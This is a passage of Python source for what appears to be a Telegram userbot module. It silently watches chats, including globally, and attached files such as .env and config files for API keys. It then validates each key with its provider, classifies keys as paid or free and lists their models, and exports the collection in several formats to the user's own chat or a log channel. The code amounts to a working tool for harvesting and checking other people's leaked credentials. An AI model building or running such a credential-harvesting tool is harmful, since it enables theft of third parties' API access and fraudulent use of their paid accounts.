        leet_doc="k3y5 m3nu",
        uwu_doc="keys menu uwu",
    )
    async def mykeys(self, message: Message):
        if not self._keys:
            return await utils.answer(message, self.strings["empty"])

        form = await self.inline.form(
            text=self.strings["loading"],
            message=message,
            reply_markup=self._get_main_markup(),
        )
        await asyncio.sleep(0.35)

        try:
            await form.edit(
                text=self._db_stats_text(),
                reply_markup=self._get_main_markup(),
            )
        except Exception:
            await self.inline.form(
                text=self._db_stats_text(),
                message=message,
                reply_markup=self._get_main_markup(),
            )

    @loader.watcher(only_messages=True)
    async def watcher(self, message: Message):
        """Catch keys in new messages AND attached text files."""
        cid = getattr(message, "chat_id", None)
        if not self._is_autocatch_enabled_for(cid):
            return

        text = getattr(message, "raw_text", None) or ""
        message_id = getattr(message, "id", 0)
        if text and self._text_might_contain_key(text) and not self._should_skip_scan(cid, message_id, text, "message"):
            asyncio.create_task(self._process_text(text, cid, via="message"))

        if self._settings.get("file_scan", True) and getattr(message, "file", None):
            mime = getattr(message.file, "mime_type", "") or ""
            name = (getattr(message.file, "name", "") or "").lower()
            size = int(getattr(message.file, "size", 0) or 0)
            TEXT_EXTS = (".txt", ".json", ".env", ".py", ".js", ".ts", ".sh",
                         ".yaml", ".yml", ".toml", ".ini", ".cfg", ".log", ".md",
                         ".xml", ".csv", ".conf", ".properties")
            TEXT_MIMES = ("text/", "application/json", "application/x-yaml",
                          "application/xml", "application/x-sh")
            is_text = (size == 0 or size <= self._max_file_scan_size) and (
                any(mime.startswith(m) for m in TEXT_MIMES) or any(name.endswith(e) for e in TEXT_EXTS)
            )
            if is_text:
                async def _scan_file(msg=message):
                    try:
                        raw = await self.client.download_media(msg, bytes)
                        if raw:
                            text_data = raw.decode("utf-8", errors="ignore")
                            if self._text_might_contain_key(text_data) and not self._should_skip_scan(cid, message_id, text_data[:4096], "file"):
                                await self._process_text(text_data, cid, via="file")
                    except Exception:
                        pass
                asyncio.create_task(_scan_file())

    @loader.watcher()
    async def edit_watcher(self, message: Message):
        """Catch keys in edited messages with 150 ms debounce — near-instant, zero flood."""
        if not self._settings.get("edit_scan", True):
            return
        cid = getattr(message, "chat_id", None)
        if not self._is_autocatch_enabled_for(cid):
            return
        if not getattr(message, "edit_date", None):
            return
        text = getattr(message, "raw_text", None) or ""
        if not text or not self._text_might_contain_key(text):
            return

        slot = f"{cid}:{getattr(message, 'id', 0)}"
        old  = self._edit_tasks.get(slot)
        if old and not old.done():
            old.cancel()

        async def _debounced(t=text, c=cid, s=slot):
            await asyncio.sleep(0.15)
            if not self._should_skip_scan(c, getattr(message, "id", 0), t, "edit"):
                await self._process_text(t, c, via="edit")
            self._edit_tasks.pop(s, None)

        self._edit_tasks[slot] = asyncio.create_task(_debounced())

    async def ks_list(self, call, page, filter_mode="all", sort_mode=None):
        sort_mode = self._normalize_sort_mode(sort_mode)
        all_keys = sorted(self._keys.keys())
        index_map = {key: idx for idx, key in enumerate(all_keys)}
        keys_list = list(self._filtered_keys(filter_mode).keys())
        if filter_mode not in {"all", "paid", "free"} and not self._provider_filter_value(filter_mode):
            filter_mode = "all"
            keys_list = all_keys
        keys_list = self._sort_keys_for_view(keys_list, sort_mode)

        per_page    = self._page_size()
        total_pages = max(1, (len(keys_list) + per_page - 1) // per_page)
        page        = max(0, min(page, total_pages - 1))
        start       = page * per_page
        cur_keys    = keys_list[start:start + per_page]
        provider_filter = self._provider_filter_value(filter_mode)
        provider_btn = self.strings["btn_filter_provider"]
        if provider_filter:
            provider_btn = f"{provider_btn}: {provider_filter}"

        markup = [[
            self._btn(("✅ " if filter_mode == "all"  else "") + self.strings["btn_filter_all"],  self.ks_list, (0, "all", sort_mode), "primary" if filter_mode == "all" else None),
            self._btn(("✅ " if filter_mode == "paid" else "") + self.strings["btn_filter_paid"], self.ks_list, (0, "paid", sort_mode), "success" if filter_mode == "paid" else None),
            self._btn(("✅ " if filter_mode == "free" else "") + self.strings["btn_filter_free"], self.ks_list, (0, "free", sort_mode), "danger" if filter_mode == "free" else None),
        ], [
            self._btn(provider_btn, self.ks_provider_menu, (page, filter_mode, sort_mode), "success" if provider_filter else None),
            self._btn(f"{self.strings['btn_sort_menu']}: {self.strings[f'sort_label_{sort_mode}']}", self.ks_sort_menu, (page, filter_mode, sort_mode), "primary"),
        ]]
        if provider_filter:
            markup.append([self._btn(self.strings["btn_filter_reset"], self.ks_list, (0, "all", sort_mode), "danger")])
        for k in cur_keys:
            idx     = index_map[k]
            markup.append([{"text": self._list_row_text(k), "callback": self.ks_key_menu, "args": (idx, self._settings.get("auto_hide_keys", True), page, filter_mode, sort_mode)}])
        if total_pages > 1:
            markup.append([
                self._btn("◀️", self.ks_list, (page - 1, filter_mode, sort_mode), "primary"),
                self._btn(f"{page + 1}/{total_pages}", self.ks_list, (page, filter_mode, sort_mode), "success"),
                self._btn("▶️", self.ks_list, (page + 1, filter_mode, sort_mode), "primary"),
            ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        await call.edit(
            text=self.strings["list_title"].format(
                page=page + 1,
                total_pages=total_pages,
                sort_label=self.strings[f"sort_label_{sort_mode}"],
                filter_label=self._filter_label(filter_mode),
                shown_count=len(cur_keys),
            ),
            reply_markup=markup,
        )

    async def ks_sort_menu(self, call, page=0, filter_mode="all", sort_mode=None):
        sort_mode = self._normalize_sort_mode(sort_mode)
        markup = [
            [
                self._btn(("✅ " if sort_mode == "recent" else "") + self.strings["btn_sort_recent"], self.ks_list, (0, filter_mode, "recent"), "primary" if sort_mode == "recent" else None),
                self._btn(("✅ " if sort_mode == "alpha" else "") + self.strings["btn_sort_alpha"], self.ks_list, (0, filter_mode, "alpha"), "primary" if sort_mode == "alpha" else None),
            ],
            [
                self._btn(("✅ " if sort_mode == "provider" else "") + self.strings["btn_sort_provider"], self.ks_list, (0, filter_mode, "provider"), "success" if sort_mode == "provider" else None),
                self._btn(("✅ " if sort_mode == "tier" else "") + self.strings["btn_sort_tier"], self.ks_list, (0, filter_mode, "tier"), "danger" if sort_mode == "tier" else None),
            ],
            [self._btn(self.strings["btn_back"], self.ks_list, (page, filter_mode, sort_mode), "primary")],
        ]
        await call.edit(text=self.strings["sort_menu_title"], reply_markup=markup)

    async def ks_provider_menu(self, call, page=0, filter_mode="all", sort_mode=None):
        sort_mode = self._normalize_sort_mode(sort_mode)
        providers = self._provider_summary()
        per_page = 8
        total_pages = max(1, (len(providers) + per_page - 1) // per_page)
        page = max(0, min(page, total_pages - 1))
        chunk = providers[page * per_page:(page + 1) * per_page]
        active_provider = self._provider_filter_value(filter_mode)
        markup = []
        for provider, stats in chunk:
            prefix = "✅ " if provider == active_provider else ""
            label = f"{prefix}{provider} · {stats['total']}"
            markup.append([self._btn(label, self.ks_list, (0, f'provider:{provider}', sort_mode), "success" if provider == active_provider else None)])
        markup.append([self._btn(self.strings["btn_filter_all"], self.ks_list, (0, "all", sort_mode), "primary")])
        if total_pages > 1:
            markup.append([
                self._btn("◀️", self.ks_provider_menu, (page - 1, filter_mode, sort_mode), "primary"),
                self._btn(f"{page + 1}/{total_pages}", self.ks_provider_menu, (page, filter_mode, sort_mode), "success"),
                self._btn("▶️", self.ks_provider_menu, (page + 1, filter_mode, sort_mode), "primary"),
            ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_list, (page, filter_mode, sort_mode), "primary")])
        await call.edit(text=self.strings["provider_menu_title"], reply_markup=markup)

    async def ks_key_menu(self, call, idx, hidden=True, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx >= len(all_keys):
            return
        k    = all_keys[idx]
        prov = self._keys[k]
        tier = {
            "paid": self.strings["tier_paid_label"],
            "free": self.strings["tier_free_label"],
        }.get(self._paid_status.get(k, ""), self.strings["tier_unknown"])
        models = self._ensure_model_cache().get(k, [])
        display = self._mask_key(k, hidden)
        markup = [
            [self._btn(self.strings["btn_show_key"] if hidden else self.strings["btn_hide_key"],
                       self.ks_key_menu, (idx, not hidden, page, filter_mode, sort_mode), "primary")],
            [
                self._btn(self.strings["btn_check_single"], self.ks_val_single, (idx, page, filter_mode, sort_mode), "success"),
                self._btn(self.strings["btn_del_single"], self.ks_del_single, (idx, page, filter_mode, sort_mode), "danger"),
            ],
            [self._btn(self.strings["btn_back"], self.ks_list, (page, filter_mode, sort_mode), "primary")],
        ]
        await call.edit(
            text=self.strings["key_info"].format(provider=prov, tier=tier, key=display, models=self._models_text(models)),
            reply_markup=markup,
        )

    async def ks_val_single(self, call, idx, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx >= len(all_keys):
            return
        k = all_keys[idx]
        async with aiohttp.ClientSession() as session:
            prov, ok = await self._validate_key(session, k)
        status = self.strings["status_valid"] if ok else self.strings["status_invalid"]
        await call.edit(
            text=self.strings["check_res_single"].format(provider=prov, status=status),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_key_menu, "args": (idx, True, page, filter_mode, sort_mode)}]],
        )

    async def ks_del_single(self, call, idx, page=0, filter_mode="all", sort_mode="recent"):
        all_keys = sorted(self._keys.keys())
        if idx < len(all_keys):
            k = all_keys[idx]
            self._keys.pop(k, None)
            self._paid_status.pop(k, None)
            self._key_meta.pop(k, None)
            self._ensure_model_cache().pop(k, None)
            self._save()
        await call.edit(
            text=self.strings["deleted"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_list, "args": (page, filter_mode, sort_mode)}]],
        )

    async def ks_val_all(self, call):
        await call.edit(text=self.strings["checking_all"].format(total=len(self._keys)))
        keys        = sorted(self._keys.keys())
        valid_c     = invalid_c = 0
        prov_stats  = {}
        self._invalid_keys_cache.clear()
        model_cache = self._ensure_model_cache()
        async with aiohttp.ClientSession() as session:
            results = await self._gather_chunked([self._validate_key(session, k) for k in keys])
            for k, (prov, ok) in zip(keys, results):
                prov_stats.setdefault(prov, {"total": 0, "valid": 0})
                prov_stats[prov]["total"] += 1
                if ok:
                    valid_c += 1
                    prov_stats[prov]["valid"] += 1
                    self._keys[k] = prov
                    try:
                        models = await self._discover_models(session, k, prov)
                        if models:
                            model_cache[k] = self._sort_models(prov, models)
                        else:
                            model_cache.pop(k, None)
                        tier = await self._check_paid(session, k, prov, models=model_cache.get(k, []))
                        if tier in (None, "unknown"):
                            tier = self._tier_from_models(prov, model_cache.get(k, [])) or "unknown"
                        self._paid_status[k] = tier
                        self._record_key_meta(k, prov, models=model_cache.get(k, []), tier=tier)
                    except Exception:
                        pass
                else:
                    invalid_c += 1
                    self._invalid_keys_cache.append(k)
        self._save()
        stats_str = "".join(
            f"<b>[{p}]:</b> {s['total']} | {s['valid']} valid\n"
            for p, s in prov_stats.items()
        )
        markup = []
        if invalid_c > 0:
            markup.append([{"text": self.strings["btn_clr_inv"], "callback": self.ks_clr_inv}])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        await call.edit(
            text=self.strings["check_res_all"].format(
                total=len(self._keys), v=valid_c, i=invalid_c, prov_stats=stats_str),
            reply_markup=markup,
        )

    async def ks_clr_inv(self, call):
        for k in self._invalid_keys_cache:
            self._keys.pop(k, None)
            self._paid_status.pop(k, None)
            self._key_meta.pop(k, None)
            self._ensure_model_cache().pop(k, None)
        self._save()
        self._invalid_keys_cache.clear()
        await call.edit(
            text=self.strings["deleted"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
        )

    async def ks_stats(self, call):
        summary = self._provider_stats_map()
        total = len(self._keys)
        providers = len(summary)
        paid = sum(item["paid"] for item in summary.values())
        free = sum(item["free"] for item in summary.values())
        unknown = sum(item["unknown"] for item in summary.values())
        models_cache = self._ensure_model_cache()
        keys_with_models = sum(1 for key in self._keys if models_cache.get(key))
        unique_models = len({model for models in models_cache.values() for model in models})
        classified = paid + free
        now = self._now_ts()
        recent_24h = sum(1 for meta in self._key_meta.values() if (meta.get("first_seen") or 0) >= now - 86400)
        avg_models = (sum(len(models) for models in models_cache.values()) / keys_with_models) if keys_with_models else 0

        lines = []
        for provider, stats in self._provider_summary():
            provider_models = len({model for key, prov in self._keys.items() if prov == provider for model in models_cache.get(key, [])})
            share = (stats["total"] / total * 100) if total else 0
            lines.append(
                self.strings["stats_provider_line"].format(
                    provider=provider,
                    count=stats["total"],
                    share=f"{share:.0f}",
                    paid=stats["paid"],
                    free=stats["free"],
                    unknown=stats["unknown"],
                    provider_models=provider_models,
                )
            )
        header = self.strings["stats_adv_header"].format(
            total=total,
            providers=providers,
            recent_24h=recent_24h,
            paid=paid,
            free=free,
            unknown=unknown,
            keys_with_models=keys_with_models,
            unique_models=unique_models,
            avg_models=f"{avg_models:.1f}",
            classified=classified,
        )

        await call.edit(
            text=header + ("\n".join(lines) or "—"),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back, "style": "primary"}]],
        )

    async def ks_exp_menu(self, call, tier_raw="", provider_raw="", page=0):
        provider_stats = self._provider_summary()
        total_pages = max(1, (len(provider_stats) + 8 - 1) // 8)
        page = max(0, min(page, total_pages - 1))
        chunk = provider_stats[page * 8:(page + 1) * 8]
        selected_tiers = self._parse_export_tokens(tier_raw)
        selected_providers = self._parse_export_tokens(provider_raw)
        matched = self._export_candidates(tier_raw, provider_raw)

        tier_labels = {
            "paid": self.strings["btn_filter_paid"],
            "free": self.strings["btn_filter_free"],
            "unknown": self.strings["tier_unknown"],
        }
        markup = [[
            self._btn(("✅ " if "paid" in selected_tiers else "") + tier_labels["paid"], self.ks_exp_toggle_tier, ("paid", tier_raw, provider_raw, page), "success" if "paid" in selected_tiers else None),
            self._btn(("✅ " if "free" in selected_tiers else "") + tier_labels["free"], self.ks_exp_toggle_tier, ("free", tier_raw, provider_raw, page), "danger" if "free" in selected_tiers else None),
            self._btn(("✅ " if "unknown" in selected_tiers else "") + tier_labels["unknown"], self.ks_exp_toggle_tier, ("unknown", tier_raw, provider_raw, page), "primary" if "unknown" in selected_tiers else None),
        ]]

        for provider, stats in chunk:
            active = provider in selected_providers
            label = f"{'✅ ' if active else ''}{provider} · {stats['total']}"
            markup.append([self._btn(label, self.ks_exp_toggle_provider, (provider, tier_raw, provider_raw, page), "success" if active else None)])

        utility_row = [
            self._btn(self.strings["btn_reset_scope"], self.ks_exp_menu, ("", "", 0), "danger"),
            self._btn(self.strings["btn_scope_next_format"], self.ks_exp_formats, (tier_raw, provider_raw), "primary"),
        ]
        markup.append(utility_row)
        if total_pages > 1:
            markup.append([
                self._btn("◀️", self.ks_exp_menu, (tier_raw, provider_raw, page - 1), "primary"),
                self._btn(f"{page + 1}/{total_pages}", self.ks_exp_menu, (tier_raw, provider_raw, page), "success"),
                self._btn("▶️", self.ks_exp_menu, (tier_raw, provider_raw, page + 1), "primary"),
            ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        scope = self._export_scope_label(tier_raw, provider_raw)
        await call.edit(
            text=(
                f"{E_DOWN} <b>{self.strings['export_scope_title']}</b>\n"
                f"{E_LIST} <b>{scope}</b>\n"
                f"{E_BOX} {self.strings['export_matching_label']}: <b>{len(matched)}</b>\n"
                f"{self.strings['export_scope_hint']}"
            ),
            reply_markup=markup,
        )

    async def ks_exp_toggle_tier(self, call, tier, tier_raw="", provider_raw="", page=0):
        await self.ks_exp_menu(call, self._toggle_export_token(tier_raw, tier), provider_raw, page)

    async def ks_exp_toggle_provider(self, call, provider, tier_raw="", provider_raw="", page=0):
        await self.ks_exp_menu(call, tier_raw, self._toggle_export_token(provider_raw, provider), page)

    async def ks_exp_formats(self, call, tier_raw="", provider_raw=""):
        data = self._export_candidates(tier_raw, provider_raw)
        if not data:
            return await call.edit(text=self.strings["export_empty_filter"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_exp_menu, (tier_raw, provider_raw, 0), "primary")]])

        markup = [
            [
                self._btn("JSON map", self.ks_exp_send, ("json_map", tier_raw, provider_raw), "primary"),
                self._btn("JSON records", self.ks_exp_send, ("json_records", tier_raw, provider_raw), "primary"),
            ],
            [
                self._btn("JSONL", self.ks_exp_send, ("jsonl", tier_raw, provider_raw), "success"),
                self._btn("CSV", self.ks_exp_send, ("csv", tier_raw, provider_raw), "success"),
            ],
            [
                self._btn("TXT raw", self.ks_exp_send, ("txt_keys", tier_raw, provider_raw), "danger"),
                self._btn("TXT full", self.ks_exp_send, ("txt_full", tier_raw, provider_raw), "danger"),
            ],
            [self._btn("ENV", self.ks_exp_send, ("env", tier_raw, provider_raw), "primary")],
            [self._btn(self.strings["btn_back"], self.ks_exp_menu, (tier_raw, provider_raw, 0), "primary")],
        ]
        await call.edit(
            text=(
                f"{E_DOWN} <b>{self.strings['export_format_title']}</b>\n"
                f"{E_LIST} <b>{self._export_scope_label(tier_raw, provider_raw)}</b>\n"
                f"{E_BOX} {self.strings['export_key_count_label']}: <b>{len(data)}</b>"
            ),
            reply_markup=markup,
        )

    async def ks_exp_send(self, call, fmt, tier_raw="", provider_raw=""):
        data = self._export_candidates(tier_raw, provider_raw)
        if not data:
            return await call.edit(text=self.strings["export_empty_filter"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_exp_menu, (tier_raw, provider_raw, 0), "primary")]])
        payload, filename, label = self._export_payload(data, fmt, tier_raw, provider_raw)
        fd = io.BytesIO(payload)
        fd.name = filename
        await self.client.send_file(
            "me",
            file=fd,
            caption=self.strings["export_caption"].format(
                label=label,
                scope=self._export_scope_label(tier_raw, provider_raw),
                count=len(data),
            ),
            parse_mode="html",
        )
        await call.edit(
            text=self.strings["exported"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
        )

    async def ks_exp_json(self, call, filter_mode="all"):
        data  = self._filtered_keys(filter_mode)
        label = {
            "all": self.strings["export_legacy_label_all"],
            "paid": self.strings["export_legacy_label_paid"],
            "free": self.strings["export_legacy_label_free"],
        }.get(filter_mode, self.strings["export_legacy_label_all"])
        fd    = io.BytesIO(json.dumps(data, indent=4).encode("utf-8"))
        suffix = {
            "paid": "_paid",
            "free": "_free",
        }.get(filter_mode, "")
        fd.name = f"keys{suffix}.json"
        await self.client.send_file(
            "me", file=fd,
            caption=f"{E_COPY} <b>{label}</b> ({len(data)} {self.strings['export_key_count_label'].lower()})",
            parse_mode="html",
        )
        await call.edit(text=self.strings["exported"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]])

    async def ks_exp_txt(self, call, filter_mode="all"):
        data  = self._filtered_keys(filter_mode)
        label = {
            "all": self.strings["export_legacy_label_all"],
            "paid": self.strings["export_legacy_label_paid"],
            "free": self.strings["export_legacy_label_free"],
        }.get(filter_mode, self.strings["export_legacy_label_all"])
        fd    = io.BytesIO("\n".join(f"{k} | {p}" for k, p in data.items()).encode("utf-8"))
        suffix = {
            "paid": "_paid",
            "free": "_free",
        }.get(filter_mode, "")
        fd.name = f"keys{suffix}.txt"
        await self.client.send_file(
            "me", file=fd,
            caption=f"{E_COPY} <b>{label}</b> ({len(data)} {self.strings['export_key_count_label'].lower()})",
            parse_mode="html",
        )
        await call.edit(text=self.strings["exported"],
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]])

    async def ks_sort_paid_free(self, call):
        total = len(self._keys)
        if not total:
            await call.edit(text=self.strings["empty"],
                reply_markup=[[self._btn(self.strings["btn_back"], self.ks_back, style="primary")]])
            return
        await call.edit(text=self.strings["sorting"].format(done=0, total=total))
        paid = free = unknown = done = 0
        async with aiohttp.ClientSession() as session:
            for key, prov in list(self._keys.items()):
                models = await self._discover_models(session, key, prov)
                if models:
                    self._ensure_model_cache()[key] = self._sort_models(prov, models)
                else:
                    self._ensure_model_cache().pop(key, None)
                sorted_models = self._ensure_model_cache().get(key, [])
                status = await self._check_paid(session, key, prov, models=sorted_models)
                if status == "unknown":
                    status = self._tier_from_models(prov, sorted_models) or "unknown"
                self._paid_status[key] = status
                self._record_key_meta(key, prov, models=sorted_models, tier=status)
                if status == "paid":   paid    += 1
                elif status == "free": free    += 1
                else:                  unknown += 1
                done += 1
                if done % 5 == 0:
                    try:
                        await call.edit(text=self.strings["sorting"].format(done=done, total=total))
                    except Exception:
                        pass
        self._save()
        markup = []
        if free:
            markup.append([self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_del_by_filter, ("free",), "danger")])
        if paid:
            markup.append([self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_del_by_filter, ("paid",), "danger")])
        markup.append([
            self._btn(f"{self.strings['btn_exp_paid']} ({paid})", self.ks_exp_txt, ("paid",), "primary"),
            self._btn(f"{self.strings['btn_exp_free']} ({free})", self.ks_exp_txt, ("free",), "primary"),
        ])
        markup.append([self._btn(self.strings["btn_back"], self.ks_back, style="primary")])
        await call.edit(
            text=self.strings["sort_done"].format(paid=paid, free=free, unknown=unknown),
            reply_markup=markup,
        )

    async def ks_del_by_filter(self, call, filter_mode):
        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == filter_mode]
        for k in to_del:
            self._keys.pop(k, None)
            self._paid_status.pop(k, None)
            self._key_meta.pop(k, None)
            self._ensure_model_cache().pop(k, None)
        self._save()
        await call.edit(
            text=self.strings["deleted_filter"].format(count=len(to_del)),
            reply_markup=[[{"text": self.strings["btn_back"], "callback": self.ks_back}]],
        )

    async def ks_settings_menu(self, call, section="main"):
        current_chat_id = self._callback_chat_id(call)
        mode = self._settings.get("log_mode", "none").upper()
        file_scan = self._setting_state(self._settings.get("file_scan", True))
        edit_scan = self._setting_state(self._settings.get("edit_scan", True))
        notify_new_keys = self._setting_state(self._settings.get("notify_new_keys", True))
        compact = self._setting_state(self._settings.get("list_compact", True))
        auto_hide = self._setting_state(self._settings.get("auto_hide_keys", True))
        auto_chat = self._setting_state(self._is_autocatch_enabled_for(current_chat_id))
        auto_global = self._setting_state(self._is_autocatch_enabled_for(GLOBAL_AUTOCATCH))
        default_sort = self.strings[f"sort_label_{self._normalize_sort_mode(self._settings.get('default_sort'))}"]
        page_size = self._page_size()
        target_text = self._log_target_text()
        topic_text = self._log_target().get("topic_title") or "Logs"

        if section == "capture":
            text = self.strings["settings_capture_title"].format(
                auto_chat=auto_chat,
                auto_global=auto_global,
                file_scan=file_scan,
                edit_scan=edit_scan,
                notify_new_keys=notify_new_keys,
            )
            markup = [
                [
                    self._btn(f"{self.strings['btn_toggle_auto_chat']} {auto_chat}", self.ks_toggle_auto_chat, style="success" if self._is_autocatch_enabled_for(current_chat_id) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_auto_global']} {auto_global}", self.ks_toggle_auto_global, style="success" if self._is_autocatch_enabled_for(GLOBAL_AUTOCATCH) else "danger"),
                ],
                [
                    self._btn(f"{self.strings['btn_toggle_file']} {file_scan}", self.ks_toggle_file, style="success" if self._settings.get("file_scan", True) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_edit']} {edit_scan}", self.ks_toggle_edit, style="success" if self._settings.get("edit_scan", True) else "danger"),
                ],
                [self._btn(f"{self.strings['btn_toggle_notify']} {notify_new_keys}", self.ks_toggle_notify, style="success" if self._settings.get("notify_new_keys", True) else "danger")],
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("main",), "primary")],
            ]
        elif section == "view":
            text = self.strings["settings_view_title"].format(
                compact=compact,
                auto_hide=auto_hide,
                page_size=page_size,
                default_sort=default_sort,
            )
            markup = [
                [
                    self._btn(f"{self.strings['btn_toggle_compact']} {compact}", self.ks_toggle_compact, style="success" if self._settings.get("list_compact", True) else "danger"),
                    self._btn(f"{self.strings['btn_toggle_autohide']} {auto_hide}", self.ks_toggle_autohide, style="success" if self._settings.get("auto_hide_keys", True) else "danger"),
                ],
                [
                    self._btn(f"{self.strings['btn_cycle_page_size']}: {page_size}", self.ks_cycle_page_size, style="primary"),
                    self._btn(f"{self.strings['btn_cycle_default_sort']}: {default_sort}", self.ks_cycle_default_sort, style="primary"),
                ],
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("main",), "primary")],
            ]
        elif section == "logs":
            text = self.strings["settings_logs_title"].format(
                log_mode=mode,
                target=target_text,
                topic=topic_text,
            )
            markup = [
                [self._btn(self.strings["btn_log_cycle"], self.ks_cycle_log, style="primary")],
                [self._btn(self.strings["btn_log_target"], self.ks_logchat_help, style="success")],
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("main",), "primary")],
            ]
        else:
            text = self.strings["settings_overview"].format(
                auto_chat=auto_chat,
                auto_global=auto_global,
                file_scan=file_scan,
                edit_scan=edit_scan,
                notify_new_keys=notify_new_keys,
                compact=compact,
                auto_hide=auto_hide,
                page_size=page_size,
                default_sort=default_sort,
                log_mode=mode,
                log_target_line=self.strings["log_target_label"].format(target=target_text),
            )
            markup = [
                [
                    self._btn(self.strings["btn_capture_settings"], self.ks_settings_menu, ("capture",), "success"),
                    self._btn(self.strings["btn_view_settings"], self.ks_settings_menu, ("view",), "primary"),
                ],
                [self._btn(self.strings["btn_logs_settings"], self.ks_settings_menu, ("logs",), "primary")],
                [self._btn(self.strings["btn_back"], self.ks_back, style="primary")],
            ]
        await call.edit(text=text, reply_markup=markup)

    async def ks_cycle_log(self, call):
        modes = ["none", "saved", "heroku", "custom"]
        cur   = self._settings.get("log_mode", "none")
        if cur not in modes:
            cur = "none"
        nxt = modes[(modes.index(cur) + 1) % len(modes)]
        self._settings["log_mode"] = nxt
        self._save()
        if nxt == "heroku":
            try:
                await self._bootstrap_heroku_logs()
            except Exception:
                pass
        await self.ks_settings_menu(call, "logs")

    @loader.command(
        ru_doc="<чат/@username/id> [топик] — чат: задать чат логов; .kslogchat topic <название> — сменить топик",
        en_doc="<chat/@username/id> [topic] — set log chat; .kslogchat topic <title> — rename topic",
        uk_doc="<чат/@username/id> [топік] — задати чат логів; .kslogchat topic <назва> — змінити топік",
        de_doc="<Chat/@username/id> [Thema] — Log-Chat setzen; .kslogchat topic <Titel> — Thema umbenennen",
        jp_doc="<チャット/@username/id> [トピック] — ログチャット設定; .kslogchat topic <タイトル> — トピック名変更",
        neofit_doc="<чат/@username/id> [топик] — задать чат логов братан; topic <название> — сменить топик",
        tiktok_doc="<чат/@username/id> [топик] — сетнуть лог чат; topic <тайтл> — переименовать",
        leet_doc="<ch4t/@u53rn4m3/1d> [t0p1c] — 53t l0g ch4t; t0p1c <t1tl3> — r3n4m3",
        uwu_doc="<chat/@username/id> [topic] — set wog chat uwu; topic <titwe> — wename",
    )
    async def kslogchat(self, message: Message):
        """
        Usage:
          .kslogchat @mychat              — set log chat, keep current topic title
          .kslogchat @mychat My Logs      — set log chat + topic title
          .kslogchat topic My Logs        — rename topic only (chat stays the same)
        """
        raw = utils.get_args_raw(message).strip()
        if not raw:
            return await utils.answer(message, self.strings["log_target_help"])

        target = self._log_target()
        if raw.lower().startswith("topic "):
            title = raw[6:].strip()[:128]
            if not title:
                return await utils.answer(message, self.strings["log_target_help"])
            target["topic_title"] = title
            target["thread_id"] = None
            self._save()
            if target.get("chat_id") is not None:
                try:
                    topic = await self._create_forum_topic(
                        target["chat_id"], title
                    )
                    if topic:
                        tid = self._topic_thread_id_from_result(topic)
                        if tid:
                            target["thread_id"] = tid
                            self._save()
                except Exception:
                    pass
            return await utils.answer(
                message,
                self.strings["log_target_topic"]
                + f"\n{self.strings['log_target_label'].format(target=self._log_target_text())}"
                + f"\n{self.strings['log_topic_label'].format(topic=target.get('topic_title') or 'Logs')}",
            )

        parts = raw.split(maxsplit=1)
        target_raw = parts[0]
        topic_title = parts[1].strip()[:128] if len(parts) > 1 else None

        try:
            resolved = await self._resolve_entity_best_effort(target_raw)
        except Exception:
            resolved = target_raw

        if resolved is None:
            return await utils.answer(message, self.strings["log_target_help"])

        if target.get("chat_id") != resolved or topic_title:
            target["thread_id"] = None
        target["chat_id"] = resolved
        if topic_title:
            target["topic_title"] = topic_title
        else:
            target.setdefault("topic_title", "Logs")
        self._save()

        try:
            topic = await self._create_forum_topic(
                resolved, target.get("topic_title") or "Logs"
            )
            if topic:
                tid = self._topic_thread_id_from_result(topic)
                if tid:
                    target["thread_id"] = tid
                    self._save()
        except Exception:
            pass

        return await utils.answer(
            message,
            self.strings["log_target_set"]
            + f"\n{self.strings['log_target_label'].format(target=self._log_target_text())}"
            + f"\n{self.strings['log_topic_label'].format(topic=target.get('topic_title') or 'Logs')}",
        )


    async def ks_logchat_help(self, call):
        await call.edit(
            text=self.strings["log_target_help"] + f"\n\n{self.strings['log_target_label'].format(target=self._log_target_text())}\n{self.strings['log_topic_label'].format(topic=self._log_target().get('topic_title') or 'Logs')}",
            reply_markup=[
                [self._btn(self.strings["btn_back"], self.ks_settings_menu, ("logs",), "primary")],
            ],
        )

    async def ks_toggle_file(self, call):
        self._settings["file_scan"] = not self._settings.get("file_scan", True)
        self._save()
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_edit(self, call):
        self._settings["edit_scan"] = not self._settings.get("edit_scan", True)
        self._save()
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_notify(self, call):
        self._settings["notify_new_keys"] = not self._settings.get("notify_new_keys", True)
        self._save()
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_auto_chat(self, call):
        self._toggle_autocatch_target(self._callback_chat_id(call))
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_auto_global(self, call):
        enabled = self._toggle_autocatch_target(GLOBAL_AUTOCATCH)
        if enabled and self._settings.get("log_mode") == "heroku":
            try:
                await self._bootstrap_heroku_logs()
            except Exception:
                pass
        await self.ks_settings_menu(call, "capture")

    async def ks_toggle_compact(self, call):
        self._settings["list_compact"] = not self._settings.get("list_compact", True)
        self._save()
        await self.ks_settings_menu(call, "view")

    async def ks_toggle_autohide(self, call):
        self._settings["auto_hide_keys"] = not self._settings.get("auto_hide_keys", True)
        self._save()
